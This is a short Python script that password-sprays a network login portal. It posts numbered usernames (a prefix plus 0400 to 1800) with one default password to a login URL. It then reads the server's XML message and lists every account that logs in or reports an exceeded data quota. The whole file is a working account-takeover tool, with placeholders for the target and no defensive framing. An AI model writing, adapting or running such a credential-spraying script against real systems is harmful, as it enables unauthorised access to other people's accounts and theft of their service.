import urllib.request
import re
import time 

HOST_URL = "host_login_url"
PASSWORD = "default_password"
USERNAME_PREFIX = "default_username_prefix"

def validateUser(user_prefix, num):
    try:
            req = urllib.request.Request(HOST_URL)
            if(num/10 < 1):
                data = 'mode=191&username=' + user_prefix + '000'+str(num)+'&password=' + PASSWORD + '&a=1355344698415' 
            elif(num/100 < 1):
                data = 'mode=191&username=' + user_prefix + '00'+str(num)+'&password=' + PASSWORD + '&a=1355344698415' 
            elif(num/1000 < 1):
                data = 'mode=191&username=' + user_prefix + '0'+str(num)+'&password=' + PASSWORD + '&a=1355344698415'
            else:
                data = 'mode=191&username=' + user_prefix + str(num)+'&password=' + PASSWORD + '&a=1355344698415'
            data = data.encode('utf-8')
            get = urllib.request.urlopen(HOST_URL,data)
            getData = get.read()
            getData = getData.decode('ascii')
            message = re.findall(r'<message>(.*?)</message>',str(getData))
            if(message[0] == '<![CDATA[Your data transfer has been exceeded, Please contact the administrator]]>' or message[0] == '<![CDATA[You have successfully logged in]]>'):
                return True
            else:
                return False
        
    except urllib.error.URLError as err:
            print(str(err))

def listUsers(user, username_prefix, num, end):
    global validUserList    
    print("Trying user : " + user)
    message = validateUser(username_prefix, num)
    if(message):
        validUserList.append(user)
    for x in validUserList:
        print(str(x))
    lines = len(validUserList) + 2
    if not end:
        for x in range(lines):
            # For List
            if(lines - x > 2):
                print("\033[F", end = '')
            # For the top two lines
            else:
                print("\033[F\033[K", end = '')
    
    #Optional sleep delay (in seconds)
    time.sleep(0)

print("Scanning for matches...")
num = 400
MAX = 1800
end = False
validUserList = []
prevcount = num
rate = 0
prev = time.perf_counter()
while(num<=MAX):
    if(num/10 < 1):
        user = USERNAME_PREFIX + '000'+str(num)
    elif(num/100 < 1):
        user = USERNAME_PREFIX + '00'+str(num) 
    elif(num/1000 < 1):
        user = USERNAME_PREFIX + '0'+str(num)
    else:
        user = USERNAME_PREFIX + str(num)
    if(time.perf_counter() - prev > 1):
        rate = num -prevcount
        prevcount = num
        prev = time.perf_counter()
    print("Scanning "+str(rate)+" users/sec")
    if (num == MAX):
        end = True
    listUsers(user, USERNAME_PREFIX, num, end)
    num=num+1

print("Scan Complete")